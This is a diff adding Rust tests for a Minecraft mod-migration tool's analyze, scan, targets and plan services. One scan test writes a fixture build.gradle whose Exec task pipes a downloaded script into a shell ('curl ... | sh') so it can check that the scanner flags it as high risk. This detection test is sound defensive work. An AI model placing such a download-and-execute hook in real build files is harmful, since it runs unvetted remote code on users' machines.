@@ -167,3 +167,169 @@ fn snapshot_helpers_round_trip_and_name_the_folder_next_to_project() {
     assert!(snap.join("checkpoints.json").is_file());
     assert!(load_store(&snap).unwrap().checkpoints.is_empty());
 }
+
+// ---- 11.A3 synchronous services: analyze, scan, targets, plan ----
+
+use std::collections::BTreeMap;
+use std::io::Write as _;
+use std::path::PathBuf;
+use ummp_core::app::views::{FileKind, RiskLevel};
+use ummp_core::app::PlanRequest;
+
+fn read_tree(root: &Path) -> BTreeMap<PathBuf, Vec<u8>> {
+    ummp_core::checkpoint::collect_files(root)
+        .unwrap()
+        .into_iter()
+        .map(|r| (r.clone(), std::fs::read(root.join(&r)).unwrap()))
+        .collect()
+}
+
+fn copy_tree(from: &Path, to: &Path) {
+    for (rel, data) in read_tree(from) {
+        let p = to.join(rel);
+        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
+        std::fs::write(p, data).unwrap();
+    }
+}
+
+fn services(dir: &Path) -> AppServices {
+    AppServices::open(Settings::new(dir.join("data"))).unwrap()
+}
+
+fn plan_req(input: PathBuf) -> PlanRequest {
+    PlanRequest {
+        input,
+        from: Some("1.21.1".into()),
+        to: "1.21.1".into(),
+        loader: Some("neoforge".into()),
+        min_confidence: 0.8,
+    }
+}
+
+#[test]
+fn analyze_reports_mod_loader_and_technologies_for_fabric_src() {
+    let d = tempdir().unwrap();
+    let a = services(d.path())
+        .analyze(&fixture("loader/fabric-src"))
+        .unwrap();
+    assert_eq!(a.kind, "folder");
+    assert!(!a.mods.is_empty(), "{a:?}");
+    assert_eq!(a.mods[0].loader, "fabric");
+    assert!(!a.mods[0].id.is_empty());
+    assert!(!a.technologies.is_empty(), "adapters should find something");
+}
+
+#[test]
+fn analyze_demo_fabric_mod_smoke() {
+    let d = tempdir().unwrap();
+    let a = services(d.path())
+        .analyze(&fixture("demo-fabric-mod"))
+        .unwrap();
+    assert!(!a.mods.is_empty());
+}
+
+#[test]
+fn bad_paths_give_input_errors_not_panics() {
+    let d = tempdir().unwrap();
+    let svc = services(d.path());
+    let missing = d.path().join("nope");
+    assert!(
+        matches!(svc.analyze(&missing), Err(AppError::Input(m)) if m.contains("does not exist"))
+    );
+    let file = d.path().join("notes.txt");
+    std::fs::write(&file, "x").unwrap();
+    assert!(matches!(svc.analyze(&file), Err(AppError::Input(_))));
+    let empty = d.path().join("empty");
+    std::fs::create_dir(&empty).unwrap();
+    assert!(matches!(svc.analyze(&empty), Err(AppError::Input(m)) if m.contains("no mod")));
+    assert!(matches!(svc.scan(&missing), Err(AppError::Input(_))));
+    assert!(matches!(
+        svc.plan(&plan_req(missing)),
+        Err(AppError::Input(_))
+    ));
+}
+
+#[test]
+fn scan_clean_source_has_no_level_and_high_fixture_is_high() {
+    let d = tempdir().unwrap();
+    let svc = services(d.path());
+    let clean = svc.scan(&fixture("loader/fabric-src")).unwrap();
+    assert_eq!(clean.level, None);
+    assert!(clean.findings.is_empty());
+
+    let bad = d.path().join("bad");
+    std::fs::create_dir(&bad).unwrap();
+    std::fs::write(
+        bad.join("build.gradle"),
+        "plugins { id 'java' }\ntask setup(type: Exec) {\n  commandLine 'sh', '-c', 'curl https://example.invalid/x.sh | sh'\n}\n",
+    )
+    .unwrap();
+    let high = svc.scan(&bad).unwrap();
+    assert_eq!(high.level, Some(RiskLevel::High));
+    assert!(high
+        .findings
+        .iter()
+        .any(|f| f.rule == "build-download-exec"));
+}
+
+#[test]
+fn targets_come_from_the_shipped_templates() {
+    let d = tempdir().unwrap();
+    let t = services(d.path()).targets();
+    for l in ["forge", "fabric", "neoforge", "quilt"] {
+        assert!(t.loaders.iter().any(|x| x == l), "{l} missing: {t:?}");
+    }
+    let v = t.versions.iter().find(|v| v.minecraft == "1.21.1").unwrap();
+    assert!(v.loaders.iter().any(|l| l == "neoforge"));
+}
+
+/// ★ mutation: make `plan` write into the input (or return no files) and this goes red.
+#[test]
+fn plan_returns_diffs_and_writes_nothing() {
+    let d = tempdir().unwrap();
+    let input = d.path().join("in");
+    copy_tree(&fixture("loader/fabric-src"), &input);
+    let before = read_tree(&input);
+
+    let plan = services(d.path()).plan(&plan_req(input.clone())).unwrap();
+
+    assert_eq!(read_tree(&input), before, "plan must not write");
+    assert!(!plan.files.is_empty(), "{plan:?}");
+    let created = plan
+        .files
+        .iter()
+        .find(|f| f.path.ends_with("neoforge.mods.toml"))
+        .unwrap_or_else(|| panic!("no neoforge descriptor in {:?}", plan.files));
+    assert_eq!(created.kind, FileKind::Created);
+    assert!(created.diff.contains("+++"), "{}", created.diff);
+    assert!(
+        plan.deletes.iter().any(|p| p.ends_with("fabric.mod.json")),
+        "{:?}",
+        plan.deletes
+    );
+    assert_eq!(plan.target_loader, "neoforge");
+    assert_eq!(plan.source_loader.as_deref(), Some("fabric"));
+}
+
+#[test]
+fn plan_reads_a_zip_and_refuses_a_downgrade() {
+    let d = tempdir().unwrap();
+    let zip = d.path().join("demo.zip");
+    {
+        let mut z = zip::ZipWriter::new(std::fs::File::create(&zip).unwrap());
+        let o = zip::write::FileOptions::default();
+        for (rel, data) in read_tree(&fixture("loader/fabric-src")) {
+            z.start_file(rel.to_string_lossy().replace('\\', "/"), o)
+                .unwrap();
+            z.write_all(&data).unwrap();
+        }
+        z.finish().unwrap();
+    }
+    let svc = services(d.path());
+    assert!(!svc.plan(&plan_req(zip.clone())).unwrap().files.is_empty());
+
+    let mut down = plan_req(zip);
+    down.from = Some("1.21.1".into());
+    down.to = "1.16.5".into();
+    assert!(matches!(svc.plan(&down), Err(AppError::Migration(_))));
+}
